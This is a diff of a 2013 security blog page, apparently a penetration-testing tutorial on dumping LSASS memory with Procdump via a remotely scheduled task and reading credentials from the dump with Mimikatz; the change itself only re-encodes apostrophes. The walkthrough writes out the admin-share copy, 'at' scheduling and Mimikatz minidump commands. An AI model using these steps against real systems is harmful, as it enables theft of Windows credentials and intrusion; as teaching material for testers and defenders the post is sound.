@@ -5,7 +5,7 @@
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="mubix">
-<meta name="description" content="Mimikatz is now built into Metasploit&#39;s meterpreter, you can do load mimikatz from the meterpreter prompt, but if you don&#39;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&#39;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool." />
+<meta name="description" content="Mimikatz is now built into Metasploit&amp;rsquo;s meterpreter, you can do load mimikatz from the meterpreter prompt, but if you don&amp;rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&amp;rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
@@ -31,7 +31,7 @@
 
 
 <meta itemprop="name" content="Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool">
-<meta itemprop="description" content="Mimikatz is now built into Metasploit&#39;s meterpreter, you can do load mimikatz from the meterpreter prompt, but if you don&#39;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&#39;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.">
+<meta itemprop="description" content="Mimikatz is now built into Metasploit&rsquo;s meterpreter, you can do load mimikatz from the meterpreter prompt, but if you don&rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.">
 <meta itemprop="datePublished" content="2013-06-07T15:00:08&#43;00:00" />
 <meta itemprop="dateModified" content="2013-06-07T15:00:08&#43;00:00" />
 <meta itemprop="wordCount" content="360">
@@ -40,7 +40,7 @@
 
 <meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool"/>
-<meta name="twitter:description" content="Mimikatz is now built into Metasploit&#39;s meterpreter, you can do load mimikatz from the meterpreter prompt, but if you don&#39;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&#39;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool."/>
+<meta name="twitter:description" content="Mimikatz is now built into Metasploit&rsquo;s meterpreter, you can do load mimikatz from the meterpreter prompt, but if you don&rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool."/>
 
 
 
@@ -119,7 +119,7 @@
             
 
             <div class="post-content">
-                <p>Mimikatz is now <a href="https://github.com/rapid7/meterpreter/pull/9">built into Metasploit's meterpreter</a>, you can do load mimikatz from the meterpreter prompt, but if you don't want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz's alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.</p>
+                <p>Mimikatz is now <a href="https://github.com/rapid7/meterpreter/pull/9">built into Metasploit&rsquo;s meterpreter</a>, you can do load mimikatz from the meterpreter prompt, but if you don&rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.</p>
 <p>Mimikatz Minidump: <a href="http://blog.gentilkiwi.com/securite/mimikatz/minidump">http://blog.gentilkiwi.com/securite/mimikatz/minidump</a></p>
 <p>Procdump: <a href="http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx">http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx</a></p>
 <p>Lets start. First we make sure our authentication works against the box and we can look inside of C$ (usually only admins can)</p>
@@ -135,7 +135,7 @@ copy c:\temp\procdump.bat \\TARGETBOXC$
 </code></pre><p>The contents of procdump.bat are:</p>
 <pre><code>@echo off
 C:\temp\procdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp
-</code></pre><p>I'm using the computer name in the memory dump name to help me keep track of where the dump came from, but also help me notice when I've dumped more than one IP that is actually the same host.</p>
+</code></pre><p>I&rsquo;m using the computer name in the memory dump name to help me keep track of where the dump came from, but also help me notice when I&rsquo;ve dumped more than one IP that is actually the same host.</p>
 <p>Next we schedule the task. Use net time to determine the local time for the remote machine.</p>
 <pre><code>net time \\TARGETBOX
 at \\TARGETBOX 13:52 C:\Temp\procdump.bat
@@ -144,7 +144,7 @@ at \\TARGETBOX 13:52 C:\Temp\procdump.bat
 copy \\TARGETBOX\C$\Temp\*lsass.dmp C:\temp\output\
 rmdir /s \\TARGETBOX\C$\Temp
 </code></pre><p>On your side the only thing you need to make sure is that you are running Mimikatz on a similar version and architecture you pulled from. Use the following url for reference:<a href="http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png">http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png</a></p>
-<p>Load up the Alpha version of Mimikatz, switch it to minidump mode and you're dumping creds:</p>
+<p>Load up the Alpha version of Mimikatz, switch it to minidump mode and you&rsquo;re dumping creds:</p>
 <pre><code>mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp
 Switch to MINIDUMP
 
